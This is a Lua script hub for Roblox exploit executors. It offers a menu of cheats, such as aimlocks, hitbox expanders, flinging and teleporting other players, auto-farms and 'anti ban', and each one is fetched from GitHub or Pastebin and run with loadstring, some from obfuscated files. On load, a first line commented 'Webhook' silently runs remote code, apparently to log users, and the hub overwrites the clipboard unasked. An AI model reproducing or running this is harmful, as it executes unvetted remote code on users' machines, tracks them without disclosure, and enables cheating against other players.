------------------------------------------------------------------------------------------------------------------------

--Webhook

loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/w3bh00k/main/s",true))()

------------------------------------------------------------------------------------------------------------------------

-- Script Hub Is Made By shakar#6955

-- Join Discord https://discord.gg/UhceAu7y

-- Library & Window

local Library = loadstring(game:HttpGet("https://pastebin.com/raw/vff1bQ9F"))()
local Window = Library.CreateLib("Universal Shakars Hub!", "Synapse")

--Notify

--1st Notify

local AkaliNotif = loadstring(game:HttpGet("https://raw.githubusercontent.com/Kinlei/Dynissimo/main/Scripts/AkaliNotif.lua"))();
local Notify = AkaliNotif.Notify;
Notify({
Description = "Join Discord https://discord.gg/g86HSsjt";
Title = "shakars hub Loaded";
Duration = 5;
});

--2nd Notify

game.StarterGui:SetCore("SendNotification", {
Title = "shakars hub Loaded"; 
Text = "Made by shakar#6955"; 
Duration = 5; 
})

game.StarterGui:SetCore("SendNotification", {
Title = "Join discord"; 
Text = "https://discord.gg/g86HSsjt"; 
Duration = 10; 
})

--3rd Notify

local NotificationBindable = Instance.new("BindableFunction")

function NotificationBindable.OnInvoke(buttonPressed)
    if buttonPressed == "Yeah" then
loadstring(game:HttpGet("https://raw.githubusercontent.com/AnthonyIsntHere/anthonysrepository/main/scripts/AntiChatLogger.lua"))()
    elseif buttonPressed == "Nah im good" then
        -- Do something when the Nah im good button is pressed
    end
end

game.StarterGui:SetCore("SendNotification", {
    Title = "Do You Want Anti Ban Script?",
    Text = "Loads Anti Ban Script",
    Button1 = "Yeah",
    Button2 = "Nah im good",
    Callback = NotificationBindable
})

------------------------------------------------------------------------------------------------------------------------

-- Tabs

local Tab1 = Window:NewTab("Main Tab")
local Tab2 = Window:NewTab("Hubs/Guis")
local Tab3 = Window:NewTab("Aimlock/Lock Scripts")
local Tab7 = Window:NewTab("Admin commands")
local Tab4 = Window:NewTab("Blox fruits scripts")
local Tab6 = Window:NewTab("Hitbox expander")
local Tab5 = Window:NewTab("Keystroke Tools")
local Tab9 = Window:NewTab("Other Scripts")
local Tab18 = Window:NewTab("Credits")

------------------------------------------------------------------------------------------------------------------------

-- Sections Inside Tabs

local Tab1Section = Tab1:NewSection("Scripts")
local Tab2Section = Tab2:NewSection("Hubs")
local Tab3Section = Tab3:NewSection("Aimlocks")
local Tab7Section = Tab7:NewSection("Admin commands")
local Tab4Section = Tab4:NewSection("Scripts")
local Tab6Section = Tab6:NewSection("Hitbox expander")
local Tab5Section = Tab5:NewSection("Keystroke Tools")
local Tab9Section = Tab9:NewSection("Scripts")
local Tab18Section = Tab18:NewSection("Credits")

------------------------------------------------------------------------------------------------------------------------

--Toggle Ui Button

--Your Codes

--Toggle
local ToggleGui = Instance.new("ScreenGui")
local Toggle = Instance.new("TextButton")
local UICorner = Instance.new("UICorner")

--Properties
ToggleGui.Name = "Toggle Gui"
ToggleGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ToggleGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ToggleGui.ResetOnSpawn = false

UICorner.Parent = Toggle
Toggle.Name = "Toggle"
Toggle.Parent = ToggleGui
Toggle.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
Toggle.Position = UDim2.new(0, 0, 0.454706937, 0)--position of the toggle
Toggle.Size = UDim2.new(0, 80, 0, 38)--size of the toggle
Toggle.Font = Enum.Font.SourceSans
Toggle.Text = "Open/Close"--name of the toggle
Toggle.TextColor3 = Color3.fromRGB(203, 122, 49)
Toggle.TextSize = 19.000
Toggle.Draggable = true
Toggle.MouseButton1Click:connect(function()
  Library:ToggleUI()
end)

------------------------------------------------------------------------------------------------------------------------

--discord server

setclipboard("https://discord.gg/g86HSsjt")

--The Scripts
Tab1Section:NewLabel("Local Player")

Tab1Section:NewSlider("Walkspeed", "Makes You Walk Faster,Max WalkSpeed Is 1000", 500, 16, function(s) -- 1000 (MaxValue) | 16 (MinValue)
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = s
end)

Tab1Section:NewTextBox("Set WalkSpeed", "Sets WalkSpeed", function(s)
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = s
	print(s)
end)

Tab1Section:NewSlider("JumpPower", "Makes You Jump Higher,Max JumpPower Is 500", 500, 50, function(s) -- 500 (MaxValue) | 50 (MinValue)
    game.Players.LocalPlayer.Character.Humanoid.JumpPower = s
end)

Tab1Section:NewTextBox("Set JumpPower", "Sets JumpPower", function(s)
    game.Players.LocalPlayer.Character.Humanoid.JumpPower = s
	print(s)
end)

Tab1Section:NewSlider("Fov Changer", "Changes Your Fov,Max Fov Is 120", 120, 0, function(s) -- 120 (MaxValue) | 50 (MinValue)
    workspace.CurrentCamera.FieldOfView = s
end)

Tab1Section:NewTextBox("Set Fov", "Sets Fov", function(s)
    workspace.CurrentCamera.FieldOfView = s
	print(s)
end)

Tab1Section:NewSlider("Gravity", "Changes Your Gravity", 500, 0, function(s) -- 500 (MaxValue) | 0 (MinValue)
    workspace.Gravity = (s)
end)

Tab1Section:NewTextBox("Set Gravity","Sets Gravity", function(s)
     workspace.Gravity = s
    	print(s)
end)

Tab1Section:NewLabel("Fling & Anti Fling")

Tab1Section:NewButton("Anti Fling V1 [ Recommended ]", "Loads a Script That Makes You Not Get Flinged", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/anti.-./main/fling",true))()
    print("Clicked")
end)

Tab1Section:NewButton("Anti Fling V2", "Loads a Script That Wont Let You Get Flinged", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/GxdesRQx'),true))()
    print("Clicked")
end)

Tab1Section:NewButton("Fe Click Fling", "Loads An Script That Gives You An Switch To Fling Ppl", function()
loadstring(game:HttpGet(('https://raw.githubusercontent.com/0Ben1/fe/main/obf_4Q10q272NIQc093Os32uBi29U9PWkU0d3Tr1Uh4k92vus2u10786Z0jep5uhqE2N.lua.txt'),true))()
    print("Clicked")
end)

Tab1Section:NewButton("Fe Touch Fling", "Loads Fe Touch Fling", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/0Ben1/fe./main/Fling%20GUI"))()
    print("Clicked")
end)

Tab1Section:NewButton("Fe Fling Gui", "Loads Fe Fling Gui", function()
loadstring(game:HttpGet('https://pastebin.com/raw/r97d7dS0', true))()
    print("Clicked")
end)

Tab1Section:NewButton("Fe Toggle Fling Gui", "Loads Fe Toggle Fling Gui", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/0Ben1/fe./main/Fling%20GUI"))()
    print("Clicked")
end)

Tab1Section:NewLabel("Rejoin Scripts")

Tab1Section:NewButton("Rejoin Button Script", "Loads a Script Whenever You Get Kicked You Can Rejoin", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/rouxhaver/scripts-2/main/rejoin%20button%20for%20kick%20message.lua", true))()
    print("Clicked")
end)

Tab1Section:NewButton("Direct Rejoin Script", "Loads a Script That Makes You Directly Rejoin", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/Direct/main/Rejoin",true))()
    print("Clicked")
end)

Tab1Section:NewLabel("Server Finder")

Tab1Section:NewButton("Server Finder", "Loads a Script That Find You Any Server You Want", function()
loadstring(game:HttpGet("https://rawscripts.net/raw/Server-Browser_80",true))()
    print("Clicked")
end)

Tab1Section:NewLabel("Infinite Jumps")

Tab1Section:NewButton("Infinite Jumps", "Makes Your Jump Infinite", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/oksinfjump/main/workssssss",true))()
    print("Clicked")
end)

Tab2Section:NewLabel("Script Hub V2")

Tab2Section:NewButton("Script Hub V2", "Loads Script Hub V2", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/SCRIPTHUBV2/main/SCRIPTHUBV2", true))()
    print("Clicked")
end)

Tab2Section:NewLabel("Kat Scripts")

Tab2Section:NewButton("Kat Aimbot", "Loads Kat AimBot", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/JNHHGaming/Kat12/main/Kat"))()
    print("Clicked")
end)

Tab2Section:NewLabel("Strong Man Simulator Script")

Tab2Section:NewButton("Strong Man Simulator Farm", "Gives You An Strong Man Simulator Gui", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/ToraIsMe2/ToraIsMe2/main/0strongman", true))()
    print("Clicked")
end)

Tab1Section:NewLabel("Flash Back")

Tab1Section:NewButton("Flash Back Script", "Gives You a Button To Flashback", function()
loadstring(game:HttpGet("https://pastebin.com/raw/cgWLwdN9", true))()
    print("Clicked")
end)

Tab1Section:NewLabel("Lag Scripts")

Tab1Section:NewButton("Fake Lag Script", "Makes You Fake Lag In Fe", function()
loadstring(game:HttpGet('https://pastebin.com/raw/VM3b0Thg'))()
    print("Clicked")
end)

Tab1Section:NewButton("Lag Switch Script", "Loads An Lag Switch Script That Only Works In R15", function()
loadstring(game:HttpGet(('https://raw.githubusercontent.com/0Ben1/fe/main/Protected%20-%202023-05-28T225112.055.lua.txt'),true))()
    print("Clicked")
end)

Tab1Section:NewLabel("Fly Scripts")

Tab1Section:NewButton("Fly Script V1", "Loads Fly Script V1", function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/Pro69Yes/sussy-Script/main/SecuredFlyGuiv3.lua'))()
    print("Clicked")
end)

Tab1Section:NewButton("Fly Script V2", "Loads Fly Script V2", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Flexzstr/FlyScript/main/Beta"))()
    print("Clicked")
end)

Tab1Section:NewButton("Fly Script V3", "Loads Fly Script V3", function()
loadstring(game:HttpGet("https://pastebin.com/raw/gJfKgLra"))();
    print("Clicked")
end)

Tab7Section:NewLabel("Infinite Yield")

Tab7Section:NewButton("Infinite Yeild", "Loads Infinite Yield Script", function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
    print("Clicked")
end)

Tab9Section:NewLabel("Keyboard Scripts")

Tab9Section:NewButton("Keyboard Script", "Loads Keyboard Script", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/advxzivhsjjdhxhsidifvsh/mobkeyboard/main/main.txt", true))()
    print("Clicked")
end)
Tab9Section:NewButton("Keyboard script V2", "Loads Keyboard Script V2", function ()
loadstring(game:HttpGet("https://raw.githubusercontent.com/BatuKvi123/Keyboardv3/main/mobKeyboard"))()
    print("Clicked")
end)

Tab9Section:NewButton("Keyboard script V3", "Loads Keyboard Script V3", function ()
loadstring(game:HttpGet("https://gist.githubusercontent.com/RedZenXYZ/4d80bfd70ee27000660e4bfa7509c667/raw/da903c570249ab3c0c1a74f3467260972c3d87e6/KeyBoard%2520From%2520Ohio%2520Fr%2520Fr"))()
    print("Clicked")
end)

Tab1Section:NewLabel("Invisible Scripts")

Tab1Section:NewButton("Invisible Script V1", "Makes You Invisible Fe", function()
loadstring(game:HttpGet('https://pastebin.com/raw/AYtzGEPb'))()
    print("Clicked")
end)

Tab1Section:NewButton("Invisible Script V2", "Makes You Invisible Fe", function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/0Ben1/fe./dbb6ce6f6cee4f7a5c9e20d7b88e83db2a93bf25/Invisible%20GUI'))()
    print("Clicked")
end)

Tab2Section:NewLabel("Chiezzy Hub")

Tab2Section:NewButton("Chiezzy Hub", "Loads Cheesy Hub", function()
loadstring(game:HttpGet("https://pastebin.com/raw/zAuR0JUT"))()
    print("Clicked")
end)

Tab2Section:NewLabel("Race Car Hub")

Tab2Section:NewButton("Race Car Script", "Loads Fe Race Car script", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Blukezz/Fe-Scripts/main/Fe%20Racecar"))()
    print("Clicked")
end)

Tab2Section:NewLabel("Random Hub")

Tab2Section:NewButton("Some Random Hub", "Loads Some Random Hub", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Vcsk/VcskV/main/Hub/main.lua", true))()
    print("Clicked")
end)

Tab2Section:NewLabel("Babft Script Hubs")

Tab2Section:NewButton("Babft Script", "Loads Babft Script", function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/XRoLLu/UWU/main/BUILD%20A%20BOAT%20FOR%20TREASURE.lua'))()
    print("Clicked")
end)

Tab2Section:NewButton("Asta Hub [ Need Key ]", "Loads Asta Hub Key is : FrWcd6dJxBd", function()
loadstring(game:HttpGet("https://pastebin.com/raw/0YezNNRh",true))()
    print("Clicked")
end)

Tab2Section:NewButton("Boat Blitz", "Loads Boat Blitz Script Hub", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/boat-blitz/main/script",true))()
    print("Clicked")
end)

Tab1Section:NewLabel("Save Location")

Tab1Section:NewButton("Fe Save Location Script", "Save Your Location Script", function()
loadstring(game:HttpGet(('https://raw.githubusercontent.com/0Ben1/fe/main/Tp%20Place%20GUI'),true))()
    print("Clicked")
end)

Tab1Section:NewLabel("Fe Free Dance")

Tab1Section:NewButton("Fe Free Dance Script", "Loads a Gui With Free Dances", function()
loadstring(game:HttpGet("https://pastebin.com/raw/eCpipCTH"))()
    print("Clicked")
end)

Tab3Section:NewLabel("Aim Viewer")

Tab3Section:NewButton("Dh Aim Viewer Script", "Loads Da Hood Aim Viewer Script", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Nosssa/NossLock/main/VinGUI"))()
    print("Clicked")
end)

Tab2Section:NewLabel("Vhub")

Tab2Section:NewButton("Vhub Script", "Loads Vhub With Alot Of Scripts", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/V31nc/2642/Created/VHub"))()
    print("Clicked")
end)

Tab3Section:NewLabel("Kals Private Lock")

Tab3Section:NewButton("Dh Kals Private Lock", "Loads Dh Kals Private Lock", function()
loadstring(game:HttpGet("https://pastebin.com/raw/j08xM9mW", true))()
    print("Clicked")
end)

Tab2Section:NewLabel("Unfair Hub")

Tab2Section:NewButton("Unfair Hub", "Loads Unfair Hub Eith Alot Of Scripts In It", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/rblxscriptsnet/rblxhub/main/rblxhub.lua"))()
    print("Clicked")
end)

Tab1Section:NewLabel("Fe Mimic")

Tab1Section:NewButton("Mimic Script", "Loads An Gui That Make You Copy Ppls Chat", function()
loadstring(game:HttpGet(('https://raw.githubusercontent.com/0Ben1/fe./8fb5ed20fb168d1ae3044ede45b90f67e3fb37a2/file'),true))()
    print("Clicked")
end)

Tab9Section:NewLabel("Fe Parkour")

Tab9Section:NewButton("Fe Parkour Script", "Loads An Script That You Can Parkour On Walls", function()
loadstring(game:HttpGet(('https://pastefy.ga/6HAb8rAj/raw'),true))()
    print("Clicked")
end)

Tab9Section:NewLabel("Troll Gui")

Tab9Section:NewButton("Troll Gui Script", "Loads Troll Gui", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/5seCbYFa'),true))()
    print("Clicked")
end)

Tab7Section:NewLabel("Legs Admin Command")

Tab7Section:NewButton("Legs Admin Command Script", "Loads Legs Admin Command", function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/leg1337/legadmv2/main/legadminv2.lua'))()
    print("Clicked")
end)

Tab9Section:NewLabel("Fe Animation Changer")

Tab9Section:NewButton("Fe Animation Changer Script", "Loads An Script That Can Change Your Animation Fe", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/LunarWareOP/Animation-Changer-Source/main/Script", true))()
    print("Clicked")
end)

Tab2Section:NewLabel("Ragdoll Engine Scripts")

Tab2Section:NewButton("Mystery Hub", "Loads A Diffrent Ragdoll Engine Scropt", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/i4mitty/MysteryHub/main/MysteryHub%20-%20Ragdoll%20Engine.lua"))()
    print("Clicked")
end)

Tab2Section:NewButton("Malware Hub", "Gives You An Hub For Ragdoll Engine", function()
loadstring(game:HttpGet('https://gist.githubusercontent.com/H20CalibreYT/462f6e6236a9371130f113def6549bb1/raw/'))()
    print("Clicked")
end)

Tab9Section:NewLabel("Rizz Script")

Tab9Section:NewButton("Rizz Script", "Loads a Script Gui That Rizz Ppl", function()
loadstring(game:HttpGet("https://pastebin.com/raw/pPMRh5YJ"))()
    print("Clicked")
end)

Tab9Section:NewLabel("Air Swim")

Tab9Section:NewButton("Air Swim", "Loads a Script That Make You Swim In The Air", function()
loadstring(game:HttpGet("https://pastebin.com/raw/9CK0qSgn"))()
    print("Clicked")
end)

Tab9Section:NewLabel("Chat Executor")

Tab9Section:NewButton("Chat Executor", "Loads a Script That Lets You Execute Script With Chat", function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/zephyr10101/chat-executor/main/chat-executor",true))()
    print("Clicked")
end)

Tab2Section:NewLabel("Bido Skins Hub")

Tab2Section:NewButton("Bido Skins Hub", "Loads Bido Skins Hub", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/BidoSkinsYT/BidoSkinsYT/main/Bido%20Skins%20V1.7"))()
    print("Clicked")
end)

Tab9Section:NewLabel("Fe Bird")

Tab9Section:NewButton("Fe Bird Script", "Loads a Script That Makes You Bird In Fe", function()
loadstring(game:HttpGet(('https://raw.githubusercontent.com/0Ben1/fe/main/Fe%20Bird%20R6%20and%20R15'),true))()
    print("Clicked")
end)

Tab2Section:NewLabel("Games Hub Destroyer")

Tab2Section:NewButton("Games Hub Destroyer V4", "Loads a Hub With Alot Of Games Script", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/TakeModzz/Games-HUB-Destroyer-V4/main/Games%20HUB%20Destroyer%20V4"))()
    print("Clicked")
end)

Tab9Section:NewLabel("Vehicle Legends")

Tab9Section:NewButton("Vehicle Legends Script", "Loads Vehicle Legends Script", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/IExpIoit/Script/main/UltimateHub"))()
    print("Clicked")
end)

Tab5Section:NewLabel("Q Tool")

Tab5Section:NewButton("Q Tool", "Loads An Script That Gives You Q Tool", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/Q/main/Tool",true))()
    print("Clicked")
end)

Tab5Section:NewLabel("G Tool")

Tab5Section:NewButton("G Tool", "Loads An Script That Gives You G Tool", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/G./main/Tool",true))()
    print("Clicked")
end)

Tab5Section:NewLabel("C Tool")

Tab5Section:NewButton("C Tool", "Loads An Script That Gives You C Tool", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/C/main/Tool",true))()
    print("Clicked")
end)

Tab3Section:NewLabel("Ryzzychips Lock")

Tab3Section:NewButton("Dh ryzzchips Lock Script", "Loads Dhat Lock Tool", function()
loadstring(game:HttpGet("https://pastebin.com/raw/j08xM9mW", true))()
    print("Clicked")
end)

Tab1Section:NewLabel("Player Specetor")

Tab1Section:NewButton("Player Specetor Script", "Loads An Script That Lets You Watch Other Players", function()
loadstring(game:HttpGet('https://pastebin.com/raw/wyvdb7gr'))()
    print("Clicked")
end)

Tab1Section:NewLabel("Tp Scripts")

Tab1Section:NewButton("Teleport Script", "Loads An Script That Lets You Teleport Other Players", function()
loadstring(game:HttpGet(("https://pastebin.com/raw/YNVbeqPy")))()
    print("Clicked")
end)

Tab1Section:NewButton("Tween Tp Script", "Loads An Script That Lets You Tween Tp Anywhere", function()
loadstring(game:HttpGet(('https://raw.githubusercontent.com/0Ben1/fe/main/obf_gtQG8WW70awuM1u2O6I8Z3j007xzGnfC0vw6D6Tzj226R20KPLyKZR8MbK5V57mu.lua.txt'),true))()
    print("Clicked")
end)

Tab1Section:NewButton("Click To Tp", "Loads An Script That Lets You Click To Tp Anywhere", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/ClickToTp/main/Script",true))()
    print("Clicked")
end)

Tab9Section:NewLabel("No Clip Gui")

Tab9Section:NewButton("No Clip Gui", "Loads An Gui That Lets You Go Inside Of Anything", function()
loadstring(game:HttpGet("https://pastebin.com/raw/pKV2Ys4E"))()
    print("Clicked")
end)

Tab9Section:NewButton("No Clip Gui V2", "Loads An Gui That Lets You Go Inside Of Anything", function()
loadstring(game:HttpGet("https://pastebin.com/raw/B5xRxTnk",true))()
    print("Clicked")
end)

Tab2Section:NewLabel("Brans Hub")

Tab2Section:NewButton("Brans Hub", "Loads Brans Hub", function()
loadstring(game:HttpGet("https://pastebin.com/raw/8G5wzp3L"))()
    print("Clicked")
end)

Tab3Section:NewLabel("Fake Macro")

Tab3Section:NewButton("Fake Macro", "Loads Fake Macro For Alot Of Diffrent Maps", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/Macro/main/M.N.C",true))()
    print("Clicked")
end)

Tab4Section:NewLabel("Chest Farm V1")

Tab4Section:NewButton("Blox Fruit Chest Farm V1", "Loads Blox Fruit Chest Farm Script", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/NickelHUBB/SonicTuru/main/ChestFarmOp"))()
    print("Clicked")
end)

Tab4Section:NewLabel("Chest Farm V2")

Tab4Section:NewButton("Blox Fruit Chest Farm V2 [ the best one ]", "Loads Blox Fruit Chest Farm Script", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/scriptpastebin/raw/main/Chest_onoff"))()
    print("Clicked")
end)

Tab4Section:NewLabel("Blox Fruit Hub")

Tab4Section:NewButton("Blox Fruit Hub", "Loads Blox Fruit Hub With Alot Of Other Hubs", function()
loadstring(game:HttpGet("https://gist.githubusercontent.com/lxnnydev/1325a6ec942d0bb837bafe0ee25fcc5c/raw/c9ab9f038142427ba1739f099e78bb0b0588fa40/bf_script.lua",true))()
    print("Clicked")
end)

Tab4Section:NewLabel("Blox Fruit Hub V2 [ Trash ]")

Tab4Section:NewButton("Blox Fruit Hub V2", "Loads a Blox Fruit Hub With Alot Of Stuffs", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/MkoriCraft/UPDBF2xSwitch/main/Protected%20(3).lua",true))()
    print("Clicked")
end)

Tab9Section:NewLabel("Ninja Legends")

Tab9Section:NewButton("Ninja Legends Gui", "Loads Ninja Legends Gui", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/AliCode14/scripts/main/ScriptHub.lua"))()
    print("Clicked")
end)

Tab3Section:NewLabel("Beamed Ware Hub")

Tab3Section:NewButton("Beamed Ware Hub", "Loads Beamed Ware Hub", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/RYZZCHIPSX/ryzzchips/main/beamed%20ware%20script"))();
    print("Clicked")
end)

Tab2Section:NewLabel("Arceus X Hub")

Tab2Section:NewButton("Arceus X Hub", "Loads Arceus X Hub Script", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/chillz-workshop/main/Arceus%20X%20V3"))()
    print("Clicked")
end)

Tab9Section:NewLabel("Netless")

Tab9Section:NewButton("Netless Script", "Loads Netless Script", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/netsless/main/netless",true))()
    print("Clicked")
end)

Tab9Section:NewLabel("Dino Animation")

Tab9Section:NewButton("Dino Animations Script", "Loads Dino Animations And Punch Script", function()
loadstring(game:HttpGet(('https://raw.githubusercontent.com/0Ben1/fe/main/obf_K2n31uc6t2wY5A8786eR4K15sgbUF0vdQ80a0LzgvLRkSNYd89H1AS3124gMR6SM.lua.txt'),true))()
    print("Clicked")
end)

Tab9Section:NewLabel("Spider Man")

Tab9Section:NewButton("SpiderMan Script", "Loads SpiderMan Script", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/Spiderman./main/Spiderman",true))()
    print("Clicked")
end)

Tab2Section:NewLabel("Pop it trading")

Tab2Section:NewButton("Pop It Trading Script", "Loads Pop It Trading Script", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Sponge123456789/Sponge/main/The%20cool%20Script"))()
    print("Clicked")
end)

Tab9Section:NewLabel("JNHH Tool Giver")

Tab9Section:NewButton("JNHH Tool Giver Script", "Loads JNHH Tool Giver Script", function()
loadstring(game:HttpGet('https://pastebin.com/raw/4yGehrgh'))()
    print("Clicked")
end)

Tab1Section:NewLabel("Universal Spy")

Tab1Section:NewButton("Universal Spy Script", "Loads a Script That Lets You Spy Other People", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/MichaelScripter/MiniScript/main/Spy gui.lua"))()
    print("Clicked")
end)

Tab9Section:NewLabel("Mm2 Scripts")

Tab9Section:NewButton("Mm2 Script Gui", "Loads Mm2 Script Gui", function()
loadstring(game:GetObjects("rbxassetid://4001118261")[1].Source)()
    print("Clicked")
end)

Tab9Section:NewButton("Mm2 Admin Panel", "Loads Mm2 Admin Panel", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/MarsQQ/ScriptHubScripts/master/MM2%20Admin%20Panel"))()
    print("Clicked")
end)

Tab9Section:NewLabel("Cw Script")

Tab9Section:NewButton("Combat Warrior Hub", "Loads Combat Warrior Nova Hub", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/SussyImposterRed/Scripts/main/NOVA_HUB_SOURCE"))()
    print("Clicked")
end)

Tab6Section:NewLabel("Hitbox Expander V1")

Tab6Section:NewButton("Hitbox Expander V1", "Loads a Script That Makes Your Hitbox Bigger", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/hit/main/box",true))()
    print("Clicked")
end)

Tab6Section:NewLabel("Hitbox Expander V2")

Tab6Section:NewButton("Hitbox Expander V2", "Loads a Script That Makes Your Hitbox Bigger", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Vcsk/RobloxScripts/main/HitboxExpander.lua"))()
    print("Clicked")
end)

Tab6Section:NewLabel("Hitbox Expander V3")

Tab6Section:NewButton("Hitbox Expander V3", "Loads a Script That Makes Your Hitbox Bigger", function()
loadstring(game:HttpGet('https://pastebin.com/raw/JgtddWA3'))()
    print("Clicked")
end)

Tab9Section:NewLabel("ApeiroPhobia Script")

Tab9Section:NewButton("ApeiroPhobia Script", "Loads An Script For ApeiroPhobia", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/apeirophobia/main/script",true))()
    print("Clicked")
end)

Tab1Section:NewLabel("Ability Wars Gui [ Key: 4M70sudE2YtN58A9 ]")

Tab1Section:NewButton("Ability Wars Gui", "Loads An Gui For Ability Wars", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/VxleLUA/Dynamic-Offical/main/System/GameChecker.lua"))()
    print("Clicked")
end)

Tab1Section:NewLabel("Fe Freeze Script")

Tab1Section:NewButton("Fe Freeze Script", "Loads An Button That Makes You Freeze", function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/creepstu/fuzzy-octo-giggle/main/Source'))()
    print("Clicked")
end)

Tab18Section:NewLabel("discord is shakar#6955")

Tab18Section:NewLabel("Credits To All The Poeple That Make The Scripts")

Tab18Section:NewLabel("Script Hub Is Made By shakar#6955")

Tab18Section:NewLabel("The gui/hub is Kavo Ui Library")

Tab18Section:NewLabel("Credits Ppl That Showcase My Script Hub")

Tab18Section:NewLabel("Credits To GamerScripter For Making The Toggle Ui Button")

Tab7Section:NewLabel("NameLess Admin Command")

Tab7Section:NewButton("Nameless Admin", "Loads An Admin that is useful", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source"))();
    print("Clicked")
  end)

Tab7Section:NewLabel("Fates Admin Command")

Tab7Section:NewButton("Fates admin", "Loads Fates admin commands", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/fatesc/fates-admin/main/main.lua"))();
    print("Clicked")
  end)

Tab7Section:NewLabel("Revis Admin Command")

Tab7Section:NewButton("Revis Admin", "Loads Revis admin commands", function()
loadstring(game:HttpGet("https://pastebin.com/raw/Caniwq2N",true))()
    print("Clicked")
  end)

Tab9Section:NewLabel("Fe Throw Gui")

Tab9Section:NewButton("Fe Throw Gui", "Loads An Gui To Throw YourSelf", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/0Ben1/fe./main/Gd"))()
    print("Clicked")
  end)

Tab1Section:NewLabel("99% Fail Impossible Obby")

Tab1Section:NewButton("99% Fail Impossible Obby Script", "Loads An Script memory all the path", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/99-fail-impossible-obby/main/ok",true))()
    print("Clicked")
  end)

Tab3Section:NewLabel("Flash Lock")

Tab3Section:NewButton("Dh Flash Lock", "Loads a Script That Gives You Lock In Dh", function()
loadstring(game:HttpGet("https://pastebin.com/raw/GXma0NrL",true))()
    print("Clicked")
end)

Tab3Section:NewLabel("Orange Box Lock")

Tab3Section:NewButton("Dh Orange Box Lock", "Loads a Script That Gives You Lock In Dh", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Ryzzchips/SubtoRyzzchips/6942334039b725b3ea380aaa7959949f938c2dc9/obf_swVYM0h5h3Rk75C9yprMgKc2ER64968pH0zAy2E30o3H3smBe01xnvZNwrm6oDYo.lua.txt", true))()
    print("Clicked")
end)

Tab3Section:NewLabel("Speed Tool")

Tab3Section:NewButton("Dh Speed Tool", "Controls C for turn on/off M for speed+ N for speed-", function()
loadstring(game:HttpGet("https://pastebin.com/raw/EX6qHypK", true))()
    print("Clicked")
end)

Tab2Section:NewLabel("British Hub")

Tab2Section:NewButton("British Hub", "Loads a British Hub [ Key: bhoñtop71404 ]", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/RedCoat8102/Britishhub/main/Protected_2739214986728285.lua.txt"))()
    print("Clicked")
end)

Tab3Section:NewLabel("Swag Mode Hub")

Tab3Section:NewButton("Dh Swag Mode", "Loads a Script Hub For Dh", function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SwagModeV002'))()
    print("Clicked")
end)

Tab3Section:NewLabel("Rage Lock")

Tab3Section:NewButton("Dh Rage Aimlock", "Loads Aimlock Script For Dh", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Ryzzchips/SubtoRyzzchips/main/Sub%20to%20Ryzzchips%20for%20more%20New%20aimlock%20script!"))()
    print("Clicked")
end)

